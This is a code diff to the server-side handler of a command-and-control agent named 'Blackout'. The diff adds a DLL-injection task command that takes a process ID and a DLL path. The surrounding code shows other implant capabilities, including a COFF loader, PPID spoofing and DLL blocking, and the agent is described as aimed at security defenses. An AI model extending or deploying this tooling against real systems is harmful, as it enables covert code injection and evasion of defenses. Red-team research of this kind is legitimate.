@@ -22,6 +22,7 @@ EXPLORER_CD  = 0x182
 EXPLORER_PWD = 0x183
 EXPLORER_CAT = 0x184
 
+CMD_DLLINJECTION         = 0x501
 COMMAND_SLEEP            = 0x111
 COMMAND_PPID             = 0x140
 COMMAND_BLOCKDLLS        = 0x141
@@ -98,6 +99,36 @@ class CommandProcEnum( Command ):
         
         return Task.buffer
     
+class CmdDllInjection( Command ):
+    CommandId   = CMD_DLLINJECTION
+    Name        = "injection_dll"
+    Description = "perform dll injection"
+    Help        = ""
+    NeedAdmin   = False
+    Params = [
+        CommandParam(
+            name="process_id",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="path_to_dll",
+            is_file_path=False,
+            is_optional=False
+        ),
+    ]
+
+    Mitr = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+        Task.add_int( int( arguments[ 'process_id' ] ) )
+        Task.add_data( arguments[ 'path_to_dll' ] )
+
+        return Task.buffer
+    
 class CommandMemoryAlloc( Command ):
     CommandId   = COMMAND_MEMORY
     Name        = "memory_alloc"
@@ -172,7 +203,9 @@ class CommandClassic( Command ):
 
         return Task.buffer
 
-class CommandRun( Command ):
+
+
+class CmdRun( Command ):
     CommandId   = COMMAND_RUN
     Name        = "process_create"
     Description = "create process with capabilities"
@@ -298,7 +331,7 @@ class CommandExitT( Command ):
 # =======================
 class Blackout(AgentType):
     Name = "blackout"
-    Author = "__oblivion"
+    Author = "oblivion"
     Version = "0.1"
     Description = f"""Blackout in security defense solutions"""
     MagicValue = 0x6F626C76 
@@ -320,12 +353,13 @@ class Blackout(AgentType):
     }
 
     Commands = [
+        CmdDllInjection(),
         CommandCheckin(),
         CommandMemoryAlloc(),
         CommandCoffLdr(),
         CommandProcEnum(),
         CommandClassic(),
-        CommandRun(),
+        CmdRun(),
         CommandCd,
         CommandPwd(),
         CommandSleep(),
